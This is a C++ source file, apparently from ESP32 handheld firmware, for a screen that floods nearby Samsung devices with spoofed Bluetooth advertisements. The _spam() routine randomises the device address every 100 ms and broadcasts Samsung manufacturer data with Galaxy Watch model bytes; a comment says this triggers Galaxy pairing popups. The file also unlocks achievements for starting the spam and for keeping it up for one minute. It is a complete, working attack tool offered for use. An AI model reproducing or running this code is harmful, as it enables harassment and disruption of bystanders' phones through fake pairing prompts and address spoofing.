#include "BLESamsungSpamScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/ble/BLEDeviceSpamMenuScreen.h"

extern "C" int ble_hs_id_set_rnd(const uint8_t *addr);

// ── Lifecycle ──────────────────────────────────────────────────────────────

BLESamsungSpamScreen::~BLESamsungSpamScreen()
{
  _stop();
}

void BLESamsungSpamScreen::onInit()
{
  int n = Achievement.inc("ble_samsung_spam_first");
  if (n == 1) Achievement.unlock("ble_samsung_spam_first");
  _spamStartMs   = millis();
  _spam1minFired = false;

  NimBLEDevice::init("");
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  _pAdv = NimBLEDevice::getAdvertising();
  _spam();
}

void BLESamsungSpamScreen::onUpdate()
{
  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      Screen.goBack();
      return;
    }
  }

  uint32_t now = millis();
  if (!_spam1minFired && now - _spamStartMs >= 60000) {
    _spam1minFired = true;
    int m = Achievement.inc("ble_samsung_spam_1min");
    if (m == 1) Achievement.unlock("ble_samsung_spam_1min");
  }
  if (now - _lastSpamMs >= 100) {
    _lastSpamMs = now;
    _spam();
  }
  if (now - _lastDrawMs >= 2000) {
    _lastDrawMs = now;
    _spinIdx    = (_spinIdx + 1) % 4;
    render();
  }
}

void BLESamsungSpamScreen::onRender()
{
  auto& lcd = Uni.Lcd;

  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    lcd.setTextDatum(BC_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawString("BACK / ENTER: Stop", bodyX() + bodyW() / 2, bodyY() + bodyH());
    _chromeDrawn = true;
  }

  const int labelH = lcd.fontHeight() + 4;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), labelH);
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  String label = String("[") + _spinner[_spinIdx] + "] Spamming...";
  sp.drawString(label.c_str(), bodyW() / 2, labelH / 2);
  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}

// ── Private ────────────────────────────────────────────────────────────────

void BLESamsungSpamScreen::_spam()
{
  // Samsung Galaxy Watch model bytes (triggers Galaxy pairing popup)
  static constexpr uint8_t kModels[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20
  };
  static constexpr int kModelCount = sizeof(kModels) / sizeof(kModels[0]);

  if (_pAdv) _pAdv->stop();

  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  ble_hs_id_set_rnd(addr);

  // Samsung manufacturer data:
  // company(2) + watch payload(11) = 13 bytes for setManufacturerData
  const uint8_t model = kModels[random(kModelCount)];
  uint8_t mfg[13] = {
    0x75, 0x00,                                     // Samsung company ID
    0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
    0xFF, 0x00, 0x00, 0x43, model
  };

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);
  advData.setManufacturerData(std::string((char*)mfg, 13));

  _pAdv->setAdvertisementData(advData);
  _pAdv->start();
}

void BLESamsungSpamScreen::_stop()
{
  if (_pAdv) {
    _pAdv->stop();
    _pAdv = nullptr;
  }
  NimBLEDevice::deinit(true);
}